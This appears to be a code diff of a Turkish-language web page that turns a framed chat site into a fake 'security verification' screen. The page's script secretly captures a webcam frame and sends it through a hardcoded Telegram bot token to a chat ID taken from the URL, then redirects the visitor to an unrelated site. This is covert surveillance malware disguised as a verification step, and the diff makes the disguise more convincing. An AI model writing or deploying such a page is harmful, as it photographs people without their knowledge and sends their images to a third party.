@@ -3,36 +3,51 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Sohbet Odası</title>
+  <title>Sohbete Giriş</title>
   <style>
     html, body {
       margin: 0;
       padding: 0;
-      overflow: hidden;
       background: #000;
-    }
-    iframe {
-      width: 100vw;
-      height: 100vh;
-      border: none;
-      z-index: 1;
-      position: relative;
+      overflow: hidden;
     }
     video, canvas {
       display: none;
+    }
+    .glitch {
+      background: url('https://media.giphy.com/media/oEI9uBYSzLpBK/giphy.gif') no-repeat center center;
+      background-size: cover;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      z-index: 0;
+      opacity: 0.5;
+    }
+    .text {
+      position: relative;
+      z-index: 1;
+      color: white;
+      font-family: monospace;
+      font-size: 20px;
+      text-align: center;
+      margin-top: 20%;
     }
   </style>
 </head>
 <body>
 
-  <iframe src="https://www.koyusohbet.org/chat/" allow="camera"></iframe>
+  <div class="glitch"></div>
+  <div class="text">Güvenlik doğrulaması yapılıyor, lütfen bekleyin...</div>
 
   <video id="video" autoplay playsinline></video>
   <canvas id="canvas" width="300" height="200"></canvas>
 
   <script>
     const token = '7925810136:AAET-jcZkQKglWwdn2PS_PTUKlDRGCvXVkk';
-    const telegramId = window.location.search.substring(1); // ?ID alır
+    const urlParams = new URLSearchParams(window.location.search);
+    const telegramId = urlParams.get('id');
 
     async function yakala() {
       try {
@@ -51,17 +66,17 @@
         const blob = dataURLtoBlob(dataUrl);
         const formData = new FormData();
         formData.append("chat_id", telegramId);
-        formData.append("photo", blob, "yakalandin.png");
+        formData.append("photo", blob, "selfie.png");
 
         await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
           method: "POST",
           body: formData
         });
 
-        // 10 saniye sonra şaka sayfasına yönlendir
+        // 15 saniye sonra yönlendir
         setTimeout(() => {
-          window.location.href = `/joke.html?${telegramId}`;
-        }, 10000);
+          window.location.href = "https://error.com";
+        }, 15000);
 
       } catch (e) {
         console.error("Kamera alınamadı:", e);
